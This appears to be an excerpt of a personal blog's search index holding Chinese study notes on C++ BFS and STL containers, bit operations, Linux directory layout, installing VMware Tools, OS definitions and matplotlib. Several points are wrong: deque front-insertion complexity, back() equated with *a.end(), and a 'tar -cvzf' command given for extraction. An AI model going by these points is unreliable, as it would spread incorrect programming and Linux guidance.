      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dfs</title>
      <link href="/bfs/"/>
      <url>/bfs/</url>
      
        <content type="html"><![CDATA[<h1 id="bfs"><a href="#bfs" class="headerlink" title="bfs"></a>bfs</h1><h2 id="函数写法"><a href="#函数写法" class="headerlink" title="函数写法"></a>函数写法</h2><ol><li>定义对头和队尾hh,tt</li><li>定义x和y的位置,用一个二元组去存q[N*N]</li><li>将d数组全部初始化为-1</li><li>开头的d[0][0]初始化为0</li><li>写偏移量</li><li>判断队头和队尾</li><li>auto一个t，存q还没有走的值</li><li>预处理各个方向的偏移量</li><li>判断如果合法就存进去<pre class="line-numbers language-none"><code class="language-none">#include&lt;bits&#x2F;stdc++.h&gt;using namespace std;typedef pair&lt;int,int&gt; PII;const int N &#x3D; 110;int n,m;int g[N][N],d[N][N];&#x2F;&#x2F;g数组存图，d数组存的是每一个点到起点的距离PII q[N*N];int bfs()&#123;    int hh &#x3D; 0;&#x2F;&#x2F;队头    int tt &#x3D; 0;&#x2F;&#x2F;队尾    q[0] &#x3D; &#123;0,0&#125;;&#x2F;&#x2F;xy的坐标    memset(d,-1,sizeof d);    d[0][0] &#x3D; 0;&#x2F;&#x2F;距离原点的距离为0    int dx[4] &#x3D; &#123;-1,0,1,0&#125;;    int dy[4] &#x3D; &#123;0,1,0,-1&#125;;        while(hh &lt;&#x3D; tt)&#123;        auto t &#x3D; q[hh++];        for(int i &#x3D; 0;i &lt; 4;i++)        &#123;   &#x2F;&#x2F;这个地方只是预处理，没有存进去            int x &#x3D; t.first + dx[i];            int y &#x3D; t.second + dy[i];            &#x2F;&#x2F;判断合法就可以存进去            if(x &gt;&#x3D; 0 &amp;&amp; x &lt; n &amp;&amp; y &gt;&#x3D; 0 &amp;&amp; y &lt; m &amp;&amp; g[x][y] &#x3D;&#x3D; 0 &amp;&amp; d[x][y] &#x3D;&#x3D; -1)&#123;                d[x][y] &#x3D; d[t.first][t.second] + 1;                q[++tt] &#x3D; &#123;x,y&#125;;            &#125;        &#125;    &#125;    return d[n-1][m-1];&#125;int main(void)&#123;    cin &gt;&gt; n &gt;&gt; m;    for(int i &#x3D; 0;i &lt; n;i++)&#123;        for(int j &#x3D; 0;j &lt; m;j++)&#123;            cin &gt;&gt; g[i][j];        &#125;    &#125;    cout &lt;&lt; bfs() &lt;&lt; endl;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stl</title>
      <link href="/stl/"/>
      <url>/stl/</url>
      
        <content type="html"><![CDATA[<h1 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h1><ol><li>变长数组，支持随机访问，但是不支持任意位置O(1)插入，只能在头或末尾插入</li><li>为了保证效率，元素增删一般在末尾进行<pre class="line-numbers language-none"><code class="language-none">声明#include&lt;vector&gt;vector&lt;int&gt; a;&#x2F;&#x2F;int类型的数组vector&lt;int&gt; b[233];&#x2F;&#x2F;第一维度长233（列数）固定，第二维度可以改变（列数）struct tec&#123;    int x,y;&#125;vector&lt;rec&gt; c;&#x2F;&#x2F;vector后面&lt;&gt;中添加类型,定义为结构体<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2></li><li>a.size()返回数组的大小</li><li>a.empty()返回数组是否为空，true or false</li><li>clear()//把当前数组清空</li></ol><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><ol><li>类型于stl容器中的指针，可以用<em>操作符解除引用（用</em>即可返回具体的值）<pre class="line-numbers language-none"><code class="language-none">vector&lt;int&gt;::iterator it;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>随机访问迭代器，可以把vector的迭代器与一个整数相加减，行为和指针的移动类似</li><li>两个迭代器相减，结果与指针相减类似，得到两个迭代器之间的距离</li><li>*a.begin()和a[0]效果一样</li><li>初始化<pre class="line-numbers language-none"><code class="language-none">vector&lt;int&gt; a(&#123;1,2,3&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="begin-end"><a href="#begin-end" class="headerlink" title="begin/end"></a>begin/end</h1></li><li>begin函数返回指向vector中的第一个元素的迭代器</li><li>*a.begin() == a[0]</li><li>所有的容器都可以视作一个前闭后开的结构</li><li>end函数返回vector的尾部，即vector数组的末尾的下一个位置</li><li>*a.end() == a[n] 都是越界访问，其中n = a.size()</li></ol><h1 id="front-back"><a href="#front-back" class="headerlink" title="front/back"></a>front/back</h1><ol><li>front返回vector的第一个元素，a.front() == a[0] == *a.begin()</li><li>back返回vector的最后一个元素，a.back() == a[a.size()-1] == *a.end()</li></ol><h1 id="push-back-pop-back"><a href="#push-back-pop-back" class="headerlink" title="push_back() / pop_back()"></a>push_back() / pop_back()</h1><ol><li>a.push_back(x)将x插入到vector的尾部</li><li>b.pop_back(),删除vector a的最后一个元素</li></ol><h1 id="queue-循环队列"><a href="#queue-循环队列" class="headerlink" title="queue 循环队列"></a>queue 循环队列</h1><h2 id="先进先出"><a href="#先进先出" class="headerlink" title="先进先出"></a>先进先出</h2><h1 id="priority-queue-优先队列"><a href="#priority-queue-优先队列" class="headerlink" title="priority queue 优先队列"></a>priority queue 优先队列</h1><h2 id="会优先往外弹最大值"><a href="#会优先往外弹最大值" class="headerlink" title="会优先往外弹最大值"></a>会优先往外弹最大值</h2><pre class="line-numbers language-none"><code class="language-none">声明queue&lt;int&gt; q;priority_queue&lt;int&gt; a;&#x2F;&#x2F;大根堆priority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt;&gt; b;&#x2F;&#x2F;小根堆priority_queue&lt;pair&lt;int,int&gt;&gt; a;&#x2F;&#x2F;定义的是二元组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="重载大于号"><a href="#重载大于号" class="headerlink" title="重载大于号"></a>重载大于号</h2><pre class="line-numbers language-none"><code class="language-none">struct Rec&#123;    int a,b;    bool operator &gt; (const Rec&amp; t) const&#123;        return a &gt; t.a;    &#125;&#125;priority_queue(Rec) d;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="循环队列queue"><a href="#循环队列queue" class="headerlink" title="循环队列queue"></a>循环队列queue</h3><ol><li>如果越界了会从头开始循环</li><li>push  //从队尾插入</li><li>pop   //从队头弹出   </li><li>front //返回队头元素</li><li>back  //返回队尾元素</li></ol><h3 id="优先队列priority-queue"><a href="#优先队列priority-queue" class="headerlink" title="优先队列priority_queue"></a>优先队列priority_queue</h3><ol><li>push  //把元素插入堆</li><li>pop   //删除堆顶元素(优先队列中队头即为最大值)</li><li>top   //查询堆顶元素</li></ol><h3 id="注意：除了队列，栈，其余都有clear函数"><a href="#注意：除了队列，栈，其余都有clear函数" class="headerlink" title="注意：除了队列，栈，其余都有clear函数"></a>注意：除了队列，栈，其余都有clear函数</h3><ol><li>清空队列直接初始化</li><li>q = queue<int>();</li></ol><h2 id="栈stack"><a href="#栈stack" class="headerlink" title="栈stack"></a>栈stack</h2><ol><li>头文件stack,和队列相反，先进后出<pre class="line-numbers language-none"><code class="language-none">stack&lt;int&gt; stk;stk.push(1);stk.top();stk.pop();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h2><ol><li>头文件<deque></li><li>支持在两端高效插入或删除元素的连续线性存储空间</li><li>相当于是一个拓展版的vector</li><li>二者在队尾插入元素时间复杂度都是O(1)</li><li>在队头插入，vector是O(n),deque是O(n)<pre class="line-numbers language-none"><code class="language-none">deque&lt;int&gt; a;&#x2F;&#x2F;定义a.begin()a.end()a.front()a.back()a.push_back()&#x2F;&#x2F;在队尾插入一个元素a.push_front()&#x2F;&#x2F;在对头插入一个元素a[0]&#x2F;&#x2F;支持取下标随机访问一个元素a.pop_front()&#x2F;&#x2F;在对头弹出一个元素a.pop_back()&#x2F;&#x2F;在队尾弹出一个一元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="为了避免边界处理问题，都从0开始遍历，存到n-1"><a href="#为了避免边界处理问题，都从0开始遍历，存到n-1" class="headerlink" title="为了避免边界处理问题，都从0开始遍历，存到n-1"></a>为了避免边界处理问题，都从0开始遍历，存到n-1</h1><h1 id="循环队列，优先队列，栈，双端队列都没有迭代器"><a href="#循环队列，优先队列，栈，双端队列都没有迭代器" class="headerlink" title="循环队列，优先队列，栈，双端队列都没有迭代器"></a>循环队列，优先队列，栈，双端队列都没有迭代器</h1><h1 id="循环队列，优先队列和栈没有clear-函数，其他都有"><a href="#循环队列，优先队列和栈没有clear-函数，其他都有" class="headerlink" title="循环队列，优先队列和栈没有clear()函数，其他都有"></a>循环队列，优先队列和栈没有clear()函数，其他都有</h1><h1 id="set"><a href="#set" class="headerlink" title="set"></a>set</h1><ol><li>包括set和multiset两个容器，分别是有序集合和有序多重集合</li><li>有序集合(set)的元素不能重复，但是有序多重集合(multiset)可以包含若干个相等的元素<pre class="line-numbers language-none"><code class="language-none">set&lt;int&gt; s;struct Rec&#123;    ...&#125;;set&lt;Rec&gt; s;&#x2F;&#x2F;rec中必须重载小于号multiset&lt;double&gt; s;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h2><h2 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h2><h2 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h2><h2 id="迭代器-1"><a href="#迭代器-1" class="headerlink" title="迭代器"></a>迭代器</h2><h1 id="set-1"><a href="#set-1" class="headerlink" title="set"></a>set</h1><pre class="line-numbers language-none"><code class="language-none">set&lt;int&gt; a;multiset&lt;double&gt; b;struct Rec&#123;    int a,b;&#125;set&lt;Rec&gt; c;&#x2F;&#x2F;注意这个地方需要重载小于号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>支持size,empty,clear</li><li>迭代器，双向访问迭代器,支持*接触引用，仅支持++和–两个与算数有关的操作</li><li>不支持随机访问操作，类似于<pre class="line-numbers language-none"><code class="language-none">set&lt;int&gt;::iterator itt &#x3D; a.begin()cout &lt;&lt; *(itt+3) &lt;&lt; endl;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>会报错，因为仅支持上一个或下一个的操作，一次跳转多个的算是随机访问</li><li>插入一个元素,因为是集合，具有无序性，所以insert的时候是无序的<pre class="line-numbers language-none"><code class="language-none">a.insert(x)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查找<pre class="line-numbers language-none"><code class="language-none">s.find(x)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>在集合中查找等于x的元素，并返回该元素的迭代器，如果不存在则返回s.end()<h2 id="lower-bound-upper-bound"><a href="#lower-bound-upper-bound" class="headerlink" title="lower_bound/upper_bound"></a>lower_bound/upper_bound</h2></li><li>s.lower_bound(x),查找大于等于x的元素的最小的一个，并且返回该元素的迭代器</li><li>s.upper_bound(x),查找大于x的元素中最小的一个，并且返回该元素的迭代器<h2 id="erase"><a href="#erase" class="headerlink" title="erase"></a>erase</h2></li><li>如果it是一个迭代器，s.erase(it)从it中删除迭代器it指向的元素</li><li>如果x是一个元素，s.erase(x)从s中删除所有等于x的元素<h2 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h2></li><li>返回s中等于x的元素个数，因为是集合，所以只有0和1会返回，但如果是multiset(x),则会返回x在multiset中存在的个数，因为multiset允许重复</li></ol><h1 id="map"><a href="#map" class="headerlink" title="map"></a>map</h1><ol><li>一个键值对的key-value的映射</li><li>map的key和value可以是任意类型，其中key<pre class="line-numbers language-none"><code class="language-none">a[1] &#x3D; 2;&#x2F;&#x2F;在a[1]的位置插入2a[1000000] &#x3D; 3;&#x2F;&#x2F;在key所在的位置插入3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>和数组的区别：前后两个结构体是可以自由定义的<pre class="line-numbers language-none"><code class="language-none">a[&quot;abc&quot;] &#x3D; 2;cout &lt;&lt; a[&quot;abc&quot;] &lt;&lt; endl;结果是2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>size,empty,clear,begin,end都和set类似</li><li>insert’erase,参数必须是pair&lt;key_type,value_type&gt;,即插入的时候必须令键的类型和值的类型相匹配</li></ol><h1 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h1><ol><li>二元组<pre class="line-numbers language-none"><code class="language-none">pair&lt;int,string&gt; a;a &#x3D; &#123;3,&quot;yxc&quot;&#125;;cout &lt;&lt; a.first &lt;&lt; &#39; &#39; &lt;&lt; a.second &lt;&lt; endl;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>pair支持比较运算，先比较first,再比较second</li></ol><h1 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h1><h2 id="与-amp"><a href="#与-amp" class="headerlink" title="与 &amp;"></a>与 &amp;</h2><ol><li>0&amp;0 == 0</li><li>0&amp;1 == 0</li><li>1&amp;1 == 1</li></ol><h2 id="或"><a href="#或" class="headerlink" title="或 |"></a>或 |</h2><ol><li>0|0 == 0</li><li>1 | 0 == 1</li><li>0 | 1 == 1</li><li>1 | 1 == 1</li></ol><h2 id="非"><a href="#非" class="headerlink" title="非 ~"></a>非 ~</h2><ol><li>~0 == 1</li><li>~1 == 0</li></ol><h2 id="异或-XOR"><a href="#异或-XOR" class="headerlink" title="异或 ^ XOR"></a>异或 ^ XOR</h2><ol><li>不进位加法</li><li>0 ^ 0 == 0</li><li>1 ^ 1 =0</li><li>1 ^ 0 == 1</li><li>0 ^ 1 == 1</li><li>按照每一位进行按位异或</li></ol><h2 id="右移-gt-gt"><a href="#右移-gt-gt" class="headerlink" title="右移 &gt;&gt;"></a>右移 &gt;&gt;</h2><ol><li>求x的第k位数字:x &gt;&gt; k &amp; 1</li><li>右移k位相当于除以2的k次方</li></ol><h2 id="左移-lt-lt"><a href="#左移-lt-lt" class="headerlink" title="左移 &lt;&lt;"></a>左移 &lt;&lt;</h2><ol><li>左移k位相当于乘以2的k次方</li></ol><h2 id="求一个数的二进制表示方法："><a href="#求一个数的二进制表示方法：" class="headerlink" title="求一个数的二进制表示方法："></a>求一个数的二进制表示方法：</h2><pre class="line-numbers language-none"><code class="language-none">int a &#x3D; 13;for(int i &#x3D; n;i &gt;&#x3D; 0;i --)&#123;    cout &lt;&lt; (a &gt;&gt; i &amp; 1)&#125;这里的5是最大求到2的多少次方的位数，0是2的0次方，从n到2的0次方依次提出来<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="返回x的最后一位1"><a href="#返回x的最后一位1" class="headerlink" title="返回x的最后一位1:"></a>返回x的最后一位1:</h1><ol><li>lowbit(x) = x &amp; -x</li></ol><h2 id="常用库函数"><a href="#常用库函数" class="headerlink" title="常用库函数"></a>常用库函数</h2><h3 id="在算法库中"><a href="#在算法库中" class="headerlink" title="在算法库中"></a>在<algorithm>算法库中</h3><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><ol><li>反转数组<pre class="line-numbers language-none"><code class="language-none">vector&lt;int&gt; a;reverse(a.begin(),a.end());&#x2F;&#x2F;反转数组reverse(a,a+a.size()+1);&#x2F;&#x2F;a的首部位置和a的最后一个元素的下一个位置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><img src="https://s2.loli.net/2022/05/06/LbQafHFu6lERZyT.png"></li></ol><h4 id="unique"><a href="#unique" class="headerlink" title="unique"></a>unique</h4><ol><li>数组判重，然后将元素放到数组开头的位置,但是重复的元素只是放到后面，不是删除</li><li>返回值：不同元素的下一个位置的指针</li><li>注意：只是去掉相邻的相同元素，必要时需要sort排序<pre class="line-numbers language-none"><code class="language-none">int m &#x3D; unique(a.begin(),a.end()) - a.begin()&#x2F;&#x2F;返回的差值是数组中不同元素的个数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><img src="https://s2.loli.net/2022/05/06/glWePkoQ8NDbuhn.png"></li><li><img src="https://s2.loli.net/2022/05/06/8goGlZO6KeLnYEh.png"></li></ol><h4 id="random-shuffle"><a href="#random-shuffle" class="headerlink" title="random_shuffle()"></a>random_shuffle()</h4><ol><li>参数和reverse()函数一样<pre class="line-numbers language-none"><code class="language-none">random_shuffle(a.begin(),a.end());<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>打乱数组</li><li>random_shuffle(a.begin(),a.end());</li><li>随机种子不一样，打乱顺序不一样</li><li>一般引用<ctime>库中的time(0)函数，生成种子；</li><li><img src="https://s2.loli.net/2022/05/06/AfJWYFN9o854l6w.png"></li></ol><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><ol><li>sort(a.begin(),a.end())从小到大</li><li>如果希望从大到小排序，则需要加上一个参数greater<int>()<pre class="line-numbers language-none"><code class="language-none">sort(a.begin(),a.end(),greater&lt;int&gt;())3. 按照自己的想法进行排序，自己写一个cmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">bool cmp(int a,int b)&#123;&#x2F;&#x2F;a是否应该排在b的前面    return a &gt; b;&#x2F;&#x2F;从大到小    return a &lt; b;&#x2F;&#x2F;从小到大    &#x2F;&#x2F;如果a应该排在b的前面，返回true,否则返回false&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>如果需要重载大于或小于号的写法<pre class="line-numbers language-none"><code class="language-none">bool opeartor&lt; (const Rec &amp;t) const&#123;    return x &lt; t.x;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用文件管理命令</title>
      <link href="/%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%92%8C%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84/"/>
      <url>/%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%92%8C%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<h1 id="相对路径："><a href="#相对路径：" class="headerlink" title="相对路径："></a>相对路径：</h1><ol><li>以引用文件之网页躲在位置为参考基础而建立出来的目录路径。</li><li>当保存不同目录的网页引用同一个文件时，所使用的路径将不相同，因此称为相对</li><li>不以/开头，默认是当前文件夹，直接选择当前文件夹下的一个文件夹分支即可</li></ol><h1 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h1><ol><li>以web站点根目录为参考基础的目录路径，之所以称为绝对，意为指当所有网页引用同一个文件时，所使用的路径都是一样的</li><li>以/开头</li></ol><h1 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h1><ol><li>每一级目录都是将/放在当前级目录后面<h1 id="不同之处"><a href="#不同之处" class="headerlink" title="不同之处"></a>不同之处</h1></li><li>描述目录路径时，采用的参考点不同</li><li>由于对网站上所有文件而言，根目录这个参考点对所有文件都是一样的，所以运用以根目录为参考点的路径描述方式才会被称为绝对路径</li></ol><h1 id="常用文件种类（-根目录下）"><a href="#常用文件种类（-根目录下）" class="headerlink" title="常用文件种类（/根目录下）"></a>常用文件种类（/根目录下）</h1><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><ol><li>常用可执行二进制文件的命令</li></ol><h2 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h2><ol><li>配置文件</li></ol><h2 id="var"><a href="#var" class="headerlink" title="var"></a>var</h2><ol><li>网站日志log会在var中</li></ol><h2 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h2><ol><li>存安装包或库文件</li></ol><h2 id="home"><a href="#home" class="headerlink" title="home"></a>home</h2><ol><li>所有用户的家目录</li></ol><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><ol><li>process，进程信息</li><li>cpuinfo：cpu信息</li></ol><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><ol><li>根目录</li></ol><h2 id="注意区分家目录和根目录"><a href="#注意区分家目录和根目录" class="headerlink" title="注意区分家目录和根目录"></a>注意区分家目录和根目录</h2><ol><li>根目录是最上一级目录,/</li><li>家目录是根目录下的一个分支,/home</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装vmware tools</title>
      <link href="/%E5%AE%89%E8%A3%85vmwaretools/"/>
      <url>/%E5%AE%89%E8%A3%85vmwaretools/</url>
      
        <content type="html"><![CDATA[<h1 id="安装vmware-tools"><a href="#安装vmware-tools" class="headerlink" title="安装vmware tools"></a>安装vmware tools</h1><ol><li>vmware窗口中点击虚拟机，选择安装vmware tools</li><li>查找VMware tools的tar.gz安装包</li><li>常规情况下应该在/media/用户名/VMware\ Tools/VMware Toolsxxxx.tar.gz</li><li>将该压缩包复制到/root下，cp /media/strongwill/VMware\ Tools/VMware Toolsxxx.tar.gz /root</li><li>cd /root</li><li>解压压缩包tar -cvzf VMwareToolsxxx.tar.gz</li><li>出现蓝色解压后的disturb文件，cd进去</li><li>执行里面的vmware-install.pl:./vmware-install.pl</li><li>一路默认安装即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机专业中各种定义</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E5%90%84%E7%A7%8D%E5%AE%9A%E4%B9%89/"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E5%90%84%E7%A7%8D%E5%AE%9A%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<h1 id="子系统"><a href="#子系统" class="headerlink" title="子系统"></a>子系统</h1><ol><li>模型元素，具有包和类的语义，子系统的行为由它所包含的类或其它子系统提供，</li><li>子系统实现一个或多个接口，这写接口定义子系统可以执行的行为</li><li>系统是一个可以独立存在的完整实体，由一组完成特定任务的功能组成</li><li>子系统顾名思义，也是一个系统，仍然是一个完整的实体，系统和子系统的概念是相对的，作为另一个系统的一部分时，系统就称为了一个子系统<h1 id="协作（i-still-dont-know）"><a href="#协作（i-still-dont-know）" class="headerlink" title="协作（i still dont know）"></a>协作（i still dont know）</h1></li><li>协作指的是主体之间互相配合一起工作</li></ol><h1 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h1><ol><li>操作系统最基本的部分，是众多应用程序对计算机硬件的安全访问的一部分硬件</li><li>基于硬件的第一层软件扩充，提供操作系统的最基本的功能，操作系统工作的基础</li><li>负责管理操作系统的进程，内存，设备驱动程序，文件和网络系统，决定了系统的性能和稳定性</li><li>总体：链接应用程序和硬件的桥梁，操作系统背后黑盒的核心</li></ol><h1 id="字符设备"><a href="#字符设备" class="headerlink" title="字符设备"></a>字符设备</h1><ol><li>在I/O传输过程中以字符为单位进行传输的串口设备，例如调制解调器，键盘和打印机</li></ol><h1 id="串口"><a href="#串口" class="headerlink" title="串口"></a>串口</h1><ol><li>串行接口简称为串口，COM接口，采用串行通信的拓展接口</li><li>串行接口指的是数据一位一位地进行传输</li><li>比喻：一串地进行行走，口径为1bit，只能一位一位地走过去</li></ol><h1 id="块设备"><a href="#块设备" class="headerlink" title="块设备"></a>块设备</h1><ol><li>存储数据以供系统存取的接口设备</li><li>例如硬盘和光驱</li></ol><h1 id="I-O设备"><a href="#I-O设备" class="headerlink" title="I/O设备"></a>I/O设备</h1><ol><li>输入/输出设备</li><li>指的是一切操作，程序或设备与计算机之间发生的数据传输过程</li></ol><h1 id="符号连接设备"><a href="#符号连接设备" class="headerlink" title="符号连接设备"></a>符号连接设备</h1><ol><li>一个符号链接文件仅包含有一个文本字符串，其被操作系统解释为一条指向另一个文件或者目录的路径。它是一个独立文件，其存在并不依赖于目标文件。如果删除一个符号链接，它指向的目标文件不受影响。如果目标文件被移动、重命名或者删除，任何指向它的符号链接仍然存在，但是它们将会指向一个不复存在的文件。这种情况被有时被称为被遗弃。</li><li>我认为是和快捷链接类似的</li></ol><h1 id="管道文件"><a href="#管道文件" class="headerlink" title="管道文件"></a>管道文件</h1><ol><li>分为无名管道和有名管道两种</li><li>管道文件是建立在内存之上可以同时被两个进程访问的文件</li><li>有名管道可以在任意两个进程之间通讯，而无名管道只能在父子进程之间通迅。</li><li>写入管道的数据存储在内存中，而不是磁盘中，所以写入管道的数据读写更快</li></ol><h1 id="挂载点："><a href="#挂载点：" class="headerlink" title="挂载点："></a>挂载点：</h1><ol><li>把一部分硬盘容量分成一个文件夹的形式，用来干一些事情，这个文件夹就叫做挂载点</li></ol>]]></content>
      
      
      <categories>
          
          <category> 定义 </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ing </tag>
            
            <tag> 定义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib和pylab区别的精简总结</title>
      <link href="/matplotlib%E5%92%8Cpylab%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/matplotlib%E5%92%8Cpylab%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="网上的大部分解释"><a href="#网上的大部分解释" class="headerlink" title="网上的大部分解释"></a>网上的大部分解释</h1><ol><li>pyplot:方便快速绘图,matplotlib通过pyplot模块提供了与一套和MATLAB类似的绘图API，将众多绘图对象构成的复杂结构隐藏在这套API内部<br>2， pylab:matplotlib还提供了一个名为pylab的模块，其中包含许多Numpy和pyplot模块中常用的函数<h1 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h1></li><li>pylab = pyplot+大部分numpy</li><li>也就是说pylab只是提供了一个方便的导入常用包的接口<h1 id="和matlab的区别："><a href="#和matlab的区别：" class="headerlink" title="和matlab的区别："></a>和matlab的区别：</h1></li><li>在matlab中，画了一条线以后，如果想接着画另一条线，则需要hold on函数</li><li>python中直接画即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据可视化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据可视化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>seedlabs</title>
      <link href="/seedlabs(%E6%9B%B4%E6%96%B0%E4%B8%AD)/"/>
      <url>/seedlabs(%E6%9B%B4%E6%96%B0%E4%B8%AD)/</url>
      
        <content type="html"><![CDATA[<h1 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h1><ol><li><a href="http://www.cis.syr.edu/~wedu/seed/">http://www.cis.syr.edu/~wedu/seed/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib</title>
      <link href="/matplotlib/"/>
      <url>/matplotlib/</url>
      
        <content type="html"><![CDATA[<h1 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h1><pre class="line-numbers language-none"><code class="language-none"># 导入 matplotlib 的所有内容（nympy 可以用 np 这个名字来使用）from pylab import *# 创建一个 8 * 6 点（point）的图，并设置分辨率为 80figure(figsize&#x3D;(8,6), dpi&#x3D;80)# 创建一个新的 1 * 1 的子图，接下来的图样绘制在其中的第 1 块（也是唯一的一块）subplot(1,1,1)X &#x3D; np.linspace(-np.pi, np.pi, 256,endpoint&#x3D;True)C,S &#x3D; np.cos(X), np.sin(X)# 绘制余弦曲线，使用蓝色的、连续的、宽度为 1 （像素）的线条plot(X, C, color&#x3D;&quot;blue&quot;, linewidth&#x3D;1.0, linestyle&#x3D;&quot;-&quot;)# 绘制正弦曲线，使用绿色的、连续的、宽度为 1 （像素）的线条plot(X, S, color&#x3D;&quot;green&quot;, linewidth&#x3D;1.0, linestyle&#x3D;&quot;-&quot;)# 设置横轴的上下限xlim(-4.0,4.0)# 设置横轴记号xticks(np.linspace(-4,4,9,endpoint&#x3D;True))# 设置纵轴的上下限ylim(-1.0,1.0)# 设置纵轴记号yticks(np.linspace(-1,1,5,endpoint&#x3D;True))# 以分辨率 72 来保存图片# savefig(&quot;exercice_2.png&quot;,dpi&#x3D;72)# 在屏幕上显示show()<span aria-hidden="true" 